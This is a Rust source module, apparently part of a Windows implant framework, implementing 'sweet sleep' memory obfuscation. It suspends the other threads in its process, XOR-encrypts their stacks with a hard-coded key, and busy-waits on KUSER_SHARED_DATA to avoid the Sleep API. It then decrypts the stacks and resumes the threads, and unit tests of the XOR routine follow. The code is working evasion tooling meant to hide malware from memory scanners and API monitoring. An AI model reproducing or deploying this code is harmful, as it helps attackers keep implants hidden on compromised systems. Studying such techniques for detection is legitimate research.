//! Sleep with stack-memory XOR obfuscation (BOAZ sleep_encrypt / SweetDreams port).
//!
//! Suspends all threads except the current one, XOR-encrypts their stacks,
//! waits using a busy-loop that reads directly from `KUSER_SHARED_DATA`
//! instead of calling `Sleep`, then decrypts and resumes.
//!
//! # Safety
//! This module is inherently unsafe — it suspends OS threads and
//! manipulates their stack memory.

use core::ffi::c_void;
use core::mem::{size_of, zeroed};
use core::ptr::null_mut;

use crate::types::{TH32CS_SNAPTHREAD, THREADENTRY32, THREAD_ALL_ACCESS};
use malefic_os_win::kit::binding::{
    MCloseHandle, MCreateToolhelp32Snapshot, MGetCurrentProcessId, MGetCurrentThread,
    MNtQueryInformationThread, MOpenThread, MResumeThread, MSuspendThread, MThread32First,
    MThread32Next,
};

/// XOR key pattern used to encrypt/decrypt stack memory (5 bytes, repeated).
const XOR_KEY: [u8; 5] = [0xAB, 0xCD, 0xE0, 0x00, 0x00];

/// ThreadBasicInformation class (0) for NtQueryInformationThread.
const THREAD_BASIC_INFORMATION: u32 = 0;

/// Minimal THREAD_BASIC_INFORMATION structure.
#[repr(C)]
struct ThreadBasicInfo {
    exit_status: i32,
    teb_base_addr: *mut u8,
    client_id_proc: usize,
    client_id_thrd: usize,
    affinity_mask: usize,
    priority: i32,
    base_priority: i32,
}

/// XOR a memory region in-place with the repeating key.
unsafe fn xor_region(base: *mut u8, size: usize) {
    for i in 0..size {
        *base.add(i) ^= XOR_KEY[i % XOR_KEY.len()];
    }
}

/// Retrieve the stack bounds for `hThread` via the TEB.
/// Returns `(stack_limit, stack_base)` where limit < base (grows down).
unsafe fn get_stack_bounds(hthread: *mut c_void) -> Option<(usize, usize)> {
    let mut tbi: ThreadBasicInfo = zeroed();
    let status = MNtQueryInformationThread(
        hthread,
        THREAD_BASIC_INFORMATION,
        &mut tbi as *mut ThreadBasicInfo as *mut c_void,
        size_of::<ThreadBasicInfo>() as u32,
        null_mut(),
    );
    if status != 0 || tbi.teb_base_addr.is_null() {
        return None;
    }
    // NT_TIB layout: [0x00] ExceptionList, [0x08] StackBase, [0x10] StackLimit
    let stack_base = *(tbi.teb_base_addr.add(0x08) as *const usize);
    let stack_limit = *(tbi.teb_base_addr.add(0x10) as *const usize);
    if stack_base == 0 || stack_limit == 0 || stack_limit >= stack_base {
        return None;
    }
    Some((stack_limit, stack_base))
}

/// Read the current system time (100-ns units) from `KUSER_SHARED_DATA`.
/// Avoids calling any Win32 API time function.
#[inline]
unsafe fn read_system_time_100ns() -> u64 {
    // KUSER_SHARED_DATA is mapped at 0x7FFE0000 on every Windows process.
    // SystemTime (KSYSTEM_TIME) is at offset 0x14:
    //   ULONG  LowPart;     // +0x14
    //   LONG   High1Time;   // +0x18
    //   LONG   High2Time;   // +0x1C
    let base = 0x7FFE0000usize as *const u8;
    let low = (base.add(0x14) as *const u32).read_volatile() as u64;
    let high = (base.add(0x18) as *const i32).read_volatile() as u64;
    (high << 32) | low
}

/// Busy-wait for `ms` milliseconds using KUSER_SHARED_DATA time.
pub fn wait_milliseconds(ms: u64) {
    unsafe {
        let end = read_system_time_100ns() + ms * 10_000;
        while read_system_time_100ns() < end {
            core::hint::spin_loop();
        }
    }
}

/// Suspend all threads in this process (except the caller), XOR their stacks,
/// sleep for `duration_ms`, XOR-decrypt stacks, and resume threads.
pub fn sweet_sleep(duration_ms: u64) {
    unsafe {
        let my_tid = {
            let mut buf: ThreadBasicInfo = zeroed();
            let h = MGetCurrentThread();
            let _ = MNtQueryInformationThread(
                h,
                THREAD_BASIC_INFORMATION,
                &mut buf as *mut _ as *mut c_void,
                size_of::<ThreadBasicInfo>() as u32,
                null_mut(),
            );
            buf.client_id_thrd as u32
        };
        let my_pid = MGetCurrentProcessId();

        // Snapshot all threads
        let snap = MCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snap.is_null() || snap == -1isize as *mut c_void {
            return;
        }

        // Collect thread handles + stack bounds
        let mut entries: Vec<(*mut c_void, usize, usize)> = Vec::new();
        let mut te: THREADENTRY32 = zeroed();
        te.dwSize = size_of::<THREADENTRY32>() as u32;

        if MThread32First(snap, &mut te as *mut THREADENTRY32 as *mut c_void) {
            loop {
                if te.th32OwnerProcessID == my_pid && te.th32ThreadID != my_tid {
                    let hthread = MOpenThread(THREAD_ALL_ACCESS, 0, te.th32ThreadID);
                    if !hthread.is_null() {
                        MSuspendThread(hthread);
                        if let Some((limit, base)) = get_stack_bounds(hthread) {
                            entries.push((hthread, limit, base));
                        } else {
                            entries.push((hthread, 0, 0));
                        }
                    }
                }
                te = zeroed();
                te.dwSize = size_of::<THREADENTRY32>() as u32;
                if !MThread32Next(snap, &mut te as *mut THREADENTRY32 as *mut c_void) {
                    break;
                }
            }
        }
        MCloseHandle(snap);

        // Encrypt stacks
        for &(_, limit, base) in &entries {
            if limit < base && base - limit < 8 * 1024 * 1024 {
                xor_region(limit as *mut u8, base - limit);
            }
        }

        // Custom sleep
        wait_milliseconds(duration_ms);

        // Decrypt stacks and resume
        for &(hthread, limit, base) in &entries {
            if limit < base && base - limit < 8 * 1024 * 1024 {
                xor_region(limit as *mut u8, base - limit);
            }
            MResumeThread(hthread);
            MCloseHandle(hthread);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_region_roundtrip() {
        let original = vec![0x48, 0x31, 0xC0, 0x90, 0xCC, 0xC3, 0x00, 0xFF];
        let mut data = original.clone();
        unsafe {
            xor_region(data.as_mut_ptr(), data.len());
            // After XOR, data should differ from original
            assert_ne!(&data, &original);
            // XOR again to decrypt
            xor_region(data.as_mut_ptr(), data.len());
        }
        assert_eq!(&data, &original);
    }

    #[test]
    fn test_xor_region_key_pattern() {
        // Verify XOR uses the expected key pattern
        let mut data = vec![0u8; 10];
        unsafe {
            xor_region(data.as_mut_ptr(), data.len());
        }
        // XOR of 0 with key byte = key byte itself
        assert_eq!(data[0], XOR_KEY[0]); // 0xAB
        assert_eq!(data[1], XOR_KEY[1]); // 0xCD
        assert_eq!(data[2], XOR_KEY[2]); // 0xE0
        assert_eq!(data[3], XOR_KEY[3]); // 0x00
        assert_eq!(data[4], XOR_KEY[4]); // 0x00
                                         // Key repeats
        assert_eq!(data[5], XOR_KEY[0]); // 0xAB
        assert_eq!(data[6], XOR_KEY[1]); // 0xCD
    }

    #[test]
    fn test_xor_region_empty() {
        let mut data: Vec<u8> = vec![];
        // Should not crash on empty input
        unsafe {
            xor_region(data.as_mut_ptr(), 0);
        }
        assert!(data.is_empty());
    }

    #[test]
    fn test_xor_region_single_byte() {
        let mut data = vec![0x42u8];
        unsafe {
            xor_region(data.as_mut_ptr(), data.len());
            assert_eq!(data[0], 0x42 ^ XOR_KEY[0]);
            xor_region(data.as_mut_ptr(), data.len());
            assert_eq!(data[0], 0x42);
        }
    }

    #[test]
    fn test_xor_key_values() {
        // Verify the XOR key is what we expect
        assert_eq!(XOR_KEY, [0xAB, 0xCD, 0xE0, 0x00, 0x00]);
    }

    #[test]
    fn test_xor_region_large_buffer() {
        let size = 4096;
        let original: Vec<u8> = (0..size).map(|i| (i & 0xFF) as u8).collect();
        let mut data = original.clone();
        unsafe {
            xor_region(data.as_mut_ptr(), data.len());
            // Verify it changed
            assert_ne!(&data, &original);
            // Decrypt
            xor_region(data.as_mut_ptr(), data.len());
        }
        assert_eq!(&data, &original);
    }
}
